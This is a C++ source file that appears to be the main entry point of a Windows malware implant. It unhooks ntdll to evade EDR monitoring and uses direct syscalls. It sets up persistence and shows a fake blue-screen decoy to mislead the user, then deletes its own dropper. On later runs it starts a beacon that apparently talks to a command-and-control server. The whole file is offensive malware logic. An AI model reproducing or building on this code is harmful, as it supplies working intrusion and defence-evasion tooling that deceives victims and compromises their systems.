#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include <windows.h>
#include <objbase.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    // 1. Evasion: Unhook ntdll immediately to bypass EDR hooks on subsequent calls
    evasion::Unhooker::RefreshNtdll();
    LOG_INFO("Ntdll unhooked.");

    // Initialize Syscall Resolver (pre-caches SSNs)
    evasion::SyscallResolver::GetInstance();

    // 2. Dual Execution Flow Logic
    // Initialize COM (needed for both persistence setup and WMI modules)
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 1;

    if (persistence::establishPersistence()) {
        // First run: persistence established, show decoy and exit (self-delete)
        LOG_INFO("Persistence established. Showing decoy and exiting.");

        // Show BSOD decoy (blocks until CTRL+B)
        decoy::ShowBSOD();

        CoUninitialize();

        // Self-delete the original dropper and exit
        utils::SelfDeleteAndExit();
        return 0;
    }

    // Subsequent run (from persistence location): Operate silently

    // Single instance check (only on persistence run)
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\BenninImplantLocalMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CoUninitialize();
        return 0;
    }

    LOG_INFO("Running implant beacon...");
    beacon::Beacon implant;
    implant.run();

    CoUninitialize();
    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
    return 0;
}
